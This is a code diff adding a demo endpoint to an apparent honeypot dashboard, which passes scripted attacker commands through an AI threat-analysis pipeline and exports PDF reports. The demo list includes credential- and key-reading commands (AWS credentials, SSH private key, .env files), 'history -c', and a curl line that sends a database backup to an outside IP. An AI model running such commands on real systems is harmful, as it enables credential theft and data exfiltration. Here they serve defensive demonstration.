@@ -10,16 +10,19 @@ Endpoints:
   GET /beacons           – all beacon events
   GET /report/{id}       – intelligence report for session
   GET /ws-test           – broadcast a scripted demo event burst (no attacker needed)
+  POST /demo/run-full    – run full AI demo pipeline showcasing all features + report
 """
 from __future__ import annotations
 
 import asyncio
+import json
 import uuid
 from datetime import datetime, timezone
 from typing import Any
 
 import structlog
-from fastapi import APIRouter, Depends, HTTPException
+from fastapi import APIRouter, Depends, HTTPException, Request
+from fastapi.responses import Response
 from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy.orm import selectinload
@@ -34,6 +37,7 @@ from database.models import (
 )
 from session.session_manager import SessionManager
 from dashboard.backend.websocket import ConnectionManager
+from ai_core.pdf_report import generate_pdf
 
 log = structlog.get_logger(__name__)
 router = APIRouter(tags=["dashboard"])
@@ -714,5 +718,197 @@ def create_dashboard_router(
 
         asyncio.create_task(_run())
         return {"status": "demo_started", "events": str(len(script))}
+
+    # ── Full AI Demo Pipeline ────────────────────────────────────────────────
+    # Simulated attacker commands that showcase every AI capability:
+    #   Intent Inference, MITRE Mapping, Environment Shaping, Threat Scoring,
+    #   Response Generation, Credential Theft Detection, Beacon Triggers,
+    #   and final Intelligence Report generation.
+    _DEMO_COMMANDS = [
+        # Phase 1 — Reconnaissance
+        "whoami",
+        "uname -a",
+        "ls -la /etc",
+        "cat /etc/passwd",
+        "ps aux",
+        "netstat -tulnp",
+        # Phase 2 — Credential Harvesting
+        "find / -name '*.env' 2>/dev/null",
+        "cat /home/admin/.env",
+        "cat /root/.aws/credentials",
+        "cat /home/admin/passwords.txt",
+        # Phase 3 — Data Collection / Lateral Movement
+        "cat /var/backups/db_backup.sql",
+        "cat /root/.ssh/id_rsa",
+        "ip addr show",
+        # Phase 4 — Privilege Escalation & Exfiltration
+        "sudo su -",
+        "cat /etc/shadow_backup",
+        "curl -s http://185.220.101.47:8080/exfil -d @/var/backups/customer_db.sql",
+        "history -c",
+    ]
+
+    @router.post("/demo/run-full", tags=["demo"])
+    async def run_full_demo(request: Request) -> dict[str, Any]:
+        """
+        Run the complete AI demo pipeline:
+        1. Create a demo session
+        2. Process 17 attacker commands through the full AI pipeline
+           (Intent Inference → Environment Shaping → MITRE Mapping →
+            Threat Scoring → Response Generation → Telemetry → WebSocket)
+        3. Generate the final LLM-powered Intelligence Report
+        4. Return the report to the frontend
+
+        All events stream live to connected WebSocket clients so the
+        dashboard updates in real-time.
+        """
+        interceptor = getattr(request.app.state, "interceptor", None)
+        if interceptor is None:
+            raise HTTPException(status_code=503, detail="AI pipeline not initialized")
+
+        now = datetime.now(timezone.utc)
+
+        # ── 1. Announce demo start ─────────────────────────────────────────
+        await ws_manager.broadcast({
+            "type": "demo_status",
+            "timestamp": now.isoformat(),
+            "data": {"phase": "starting", "message": "AI Demo Script initializing…"},
+        })
+
+        # ── 2. Create a demo session via session manager ───────────────────
+        demo_state = await session_manager.create_session(
+            source_ip="185.220.101.47",
+            username="root",
+        )
+        demo_sid = str(demo_state.session_id)
+
+        # Broadcast session-started to dashboard
+        await ws_manager.broadcast(
+            ws_manager.make_event("session", demo_sid, {
+                "action": "started",
+                "source_ip": "185.220.101.47",
+                "username": "root",
+            })
+        )
+
+        # ── 3. Run each command through the real AI pipeline ───────────────
+        total = len(_DEMO_COMMANDS)
+        for idx, command in enumerate(_DEMO_COMMANDS, 1):
+            # Notify progress
+            await ws_manager.broadcast({
+                "type": "demo_status",
+                "session_id": demo_sid,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "data": {
+                    "phase": "processing",
+                    "step": idx,
+                    "total": total,
+                    "command": command,
+                    "message": f"[{idx}/{total}] Processing: {command}",
+                },
+            })
+
+            try:
+                # This triggers the full AI pipeline: intent, env shaping,
+                # MITRE mapping, threat scoring, response gen, telemetry,
+                # and all WebSocket events.
+                _response = await interceptor.process(demo_state, command)
+
+                # Record in command history (the interceptor may already do
+                # this; but ensure it's tracked for the report)
+                demo_state.command_history.append({
+                    "command": command,
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
+                    "response": _response[:200] if _response else "",
+                })
+            except Exception as exc:
+                log.warning("demo_command_error", command=command, error=str(exc))
+
+            # Pace the demo so the frontend can animate (1.2s between cmds)
+            await asyncio.sleep(1.2)
+
+        # ── 4. Generate Intelligence Report via LLM ────────────────────────
+        await ws_manager.broadcast({
+            "type": "demo_status",
+            "session_id": demo_sid,
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "data": {
+                "phase": "report",
+                "message": "Generating AI Intelligence Report via LLM…",
+            },
+        })
+
+        report_data = {}
+        report_gen = getattr(interceptor, "_reporter", None)
+        if report_gen:
+            try:
+                report_data = await report_gen.generate(demo_state)
+            except Exception as exc:
+                log.warning("demo_report_error", error=str(exc))
+                report_data = {
+                    "executive_summary": f"Report generation encountered an error: {exc}",
+                    "error": str(exc),
+                }
+
+        report_data["session_id"] = demo_sid
+        report_data["generated_at"] = datetime.now(timezone.utc).isoformat()
+
+        # Broadcast report to dashboard
+        await ws_manager.broadcast(
+            ws_manager.make_event("report_generated", demo_sid, {
+                "report": report_data,
+            })
+        )
+
+        # ── 5. Announce completion ─────────────────────────────────────────
+        await ws_manager.broadcast({
+            "type": "demo_status",
+            "session_id": demo_sid,
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "data": {
+                "phase": "complete",
+                "message": "AI Demo complete — Intelligence Report generated.",
+                "commands_processed": total,
+                "final_risk_score": demo_state.risk_score,
+                "final_threat_level": demo_state.threat_level,
+            },
+        })
+
+        return {
+            "status": "demo_complete",
+            "session_id": demo_sid,
+            "commands_processed": total,
+            "final_risk_score": demo_state.risk_score,
+            "final_threat_level": demo_state.threat_level,
+            "report": report_data,
+        }
+
+    # ── PDF Report Download ────────────────────────────────────────────────
+    @router.post("/report/pdf", tags=["report"])
+    async def download_report_pdf(request: Request) -> Response:
+        """
+        Accept a report JSON body and return it as a downloadable PDF.
+        """
+        try:
+            report_data = await request.json()
+        except Exception:
+            raise HTTPException(status_code=400, detail="Invalid JSON body")
+
+        try:
+            pdf_bytes = generate_pdf(report_data)
+        except Exception as exc:
+            log.warning("pdf_generation_error", error=str(exc))
+            raise HTTPException(status_code=500, detail=f"PDF generation failed: {exc}")
+
+        session_id = report_data.get("session_id", "unknown")[:40]
+        filename = f"ghost_protocol_report_{session_id}.pdf"
+
+        return Response(
+            content=pdf_bytes,
+            media_type="application/pdf",
+            headers={
+                "Content-Disposition": f'attachment; filename="{filename}"',
+            },
+        )
 
     return router
